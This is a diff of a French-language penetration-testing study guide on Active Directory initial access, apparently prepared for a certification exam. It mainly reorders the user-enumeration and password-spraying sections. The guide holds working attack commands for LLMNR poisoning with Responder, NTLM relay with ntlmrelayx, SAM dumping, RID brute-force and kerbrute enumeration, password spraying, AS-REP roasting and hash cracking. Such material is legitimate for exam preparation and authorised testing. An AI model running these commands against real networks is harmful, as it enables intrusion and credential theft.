@@ -1,4 +1,4 @@
-# Phase 2 — Accès Initial
+# Phase 2 : Accès Initial
 
 ## Le problème
 
@@ -24,9 +24,9 @@ Y a-t-il des machines sans signature SMB ?
 IPv6 actif sur le réseau (pas de DHCPv6) ?
     → OUI → MITMv6 + relay vers LDAP (2.3)
 
-J'ai une liste d'utilisateurs ?
-    → OUI → Password Spraying (2.4)
-    → NON → Énumération users sans credentials (2.5) puis spraying
+Pas encore de credentials ni de liste users ?
+    → Énumération users sans credentials (2.4)
+    → Puis Password Spraying (2.5)
 ```
 
 !!! tip "Recommandation exam"
@@ -34,7 +34,7 @@ J'ai une liste d'utilisateurs ?
 
 ---
 
-## 2.1 — Poisoning LLMNR / NBT-NS avec Responder
+## 2.1 : Poisoning LLMNR / NBT-NS avec Responder
 
 ### Le problème de résolution de noms
 
@@ -100,7 +100,7 @@ user   domain      challenge         response NTLMv2
 
 ### Qu'est-ce qu'on fait avec ce hash ?
 
-**Option 1 — Le cracker offline avec Hashcat**
+**Option 1 : Le cracker offline avec Hashcat**
 
 ```bash
 hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
@@ -109,16 +109,16 @@ hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
 
 Si le mot de passe est faible, tu l'obtiens en clair.
 
-**Option 2 — Le relayer directement (sans le cracker)**
+**Option 2 : Le relayer directement (sans le cracker)**
 
 → Voir section 2.2 ci-dessous.
 
 !!! warning "À retenir"
-    Ce hash NTLMv2 **n'est pas utilisable directement en Pass-the-Hash**. Il faut le cracker ou le relayer. Voir [NTLM — distinction critique](../fondamentaux/ntlm.md).
+    Ce hash NTLMv2 **n'est pas utilisable directement en Pass-the-Hash**. Il faut le cracker ou le relayer. Voir [NTLM : distinction critique](../fondamentaux/ntlm.md).
 
 ---
 
-## 2.2 — NTLM Relay Attack
+## 2.2 : NTLM Relay Attack
 
 ### Le concept
 
@@ -148,19 +148,19 @@ cat ~/certif/targets_relay.txt
     Pour que le relay fonctionne, la **signature SMB doit être désactivée** sur la cible.
     C'est souvent le cas sur les postes de travail, rarement sur les DC.
 
-### Lancement — 2 terminaux
+### Lancement : 2 terminaux
 
-**Terminal 1 — Responder (SMB et HTTP désactivés)**
+**Terminal 1 : Responder (SMB et HTTP désactivés)**
 
 ```bash
 # Editer /etc/responder/Responder.conf : SMB = Off, HTTP = Off
 sudo nano /etc/responder/Responder.conf
 
-# Lancer Responder — empoisonne mais ne sert pas les réponses
+# Lancer Responder : empoisonne mais ne sert pas les réponses
 sudo responder -I $IFACE -rdw
 ```
 
-**Terminal 2 — ntlmrelayx**
+**Terminal 2 : ntlmrelayx**
 
 ```bash
 # Relay basique → dump SAM si admin
@@ -173,7 +173,7 @@ ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks
 ntlmrelayx.py -t ldap://$DC_IP --no-da --no-acl
 ```
 
-### Mode SOCKS — Utiliser via proxychains
+### Mode SOCKS : Utiliser via proxychains
 
 ```bash
 # Dans ntlmrelayx, taper "socks" pour voir les sessions actives
@@ -190,7 +190,7 @@ proxychains -q secretsdump.py $DOMAIN/$USER@$TARGET -no-pass
 
 ---
 
-## 2.3 — IPv6 + MITMv6
+## 2.3 : IPv6 + MITMv6
 
 ### Le problème IPv6 dans les AD
 
@@ -220,7 +220,35 @@ ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support \
 
 ---
 
-## 2.4 — Password Spraying
+## 2.4 : Énumération d'utilisateurs sans credentials
+
+Avant de pouvoir sprayer, il faut une liste de comptes valides. Trois méthodes à tester dans l'ordre :
+
+```bash
+# Méthode 1 : RID brute force via null session (la plus fiable)
+nxc smb $DC_IP -u '' -p '' --rid-brute 5000 2>/dev/null \
+    | grep SidTypeUser \
+    | awk -F'\' '{print $NF}' | cut -d' ' -f1 \
+    > ~/certif/users.txt
+
+# Méthode 2 : Kerbrute (validation via AS-REQ Kerberos, très discret)
+kerbrute userenum --dc $DC_IP -d $DOMAIN_FQDN \
+    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+    -o ~/certif/valid_users.txt
+
+# Méthode 3 : LDAP anonyme (si le DC l'autorise)
+ldapsearch -x -H ldap://$DC_IP \
+    -b "DC=${DOMAIN_FQDN/./,DC=}" \
+    "(objectClass=user)" sAMAccountName 2>/dev/null \
+    | grep sAMAccountName | awk '{print $2}' \
+    > ~/certif/users.txt
+```
+
+Une fois `~/certif/users.txt` généré, tu peux passer au spraying (2.5) et à l'AS-REP Roasting (2.6).
+
+---
+
+## 2.5 : Password Spraying
 
 ### Le concept
 
@@ -263,33 +291,7 @@ kerbrute passwordspray --dc $DC_IP -d $DOMAIN_FQDN \
 
 ---
 
-## 2.5 — Énumération d'utilisateurs sans credentials
-
-Si tu n'as pas encore de liste d'utilisateurs :
-
-```bash
-# RID brute force (null session)
-nxc smb $DC_IP -u '' -p '' --rid-brute 5000 2>/dev/null \
-    | grep SidTypeUser \
-    | awk -F'\' '{print $NF}' | cut -d' ' -f1 \
-    > ~/certif/users.txt
-
-# Kerbrute (valider via AS-REQ Kerberos)
-kerbrute userenum --dc $DC_IP -d $DOMAIN_FQDN \
-    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-    -o ~/certif/valid_users.txt
-
-# LDAP anonyme
-ldapsearch -x -H ldap://$DC_IP \
-    -b "DC=${DOMAIN_FQDN/./,DC=}" \
-    "(objectClass=user)" sAMAccountName 2>/dev/null \
-    | grep sAMAccountName | awk '{print $2}' \
-    > ~/certif/users.txt
-```
-
----
-
-## 2.6 — AS-REP Roasting sans credentials
+## 2.6 : AS-REP Roasting sans credentials
 
 Si tu as une liste d'utilisateurs, tente l'AS-REP Roasting directement :
 
@@ -305,7 +307,7 @@ hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 2.7 — Valider et diffuser les credentials obtenus
+## 2.7 : Valider et diffuser les credentials obtenus
 
 ```bash
 # Dès qu'on a user:password → tester sur tout le réseau
@@ -330,7 +332,9 @@ echo "USER=$USER | PWD=$PWD" >> ~/certif/notes.txt
 - [ ] Liste cibles relay générée (`--gen-relay-list`)
 - [ ] ntlmrelayx lancé si cibles sans signing SMB
 - [ ] mitm6 lancé (IPv6)
-- [ ] Password spraying effectué (politique lockout vérifiée d'abord)
-- [ ] AS-REP Roasting tenté sans auth
+- [ ] Énumération users tentée (RID brute / kerbrute / LDAP anonyme) → `~/certif/users.txt`
+- [ ] Politique de verrouillage vérifiée (`--pass-pol`) avant spraying
+- [ ] Password spraying effectué (1 mot de passe à la fois)
+- [ ] AS-REP Roasting tenté sans auth (`GetNPUsers.py`)
 - [ ] Credentials validés avec `nxc smb $RANGE`
 - [ ] **Au moins 1 compte valide** → continuer en [Phase 3](03-enumeration.md)
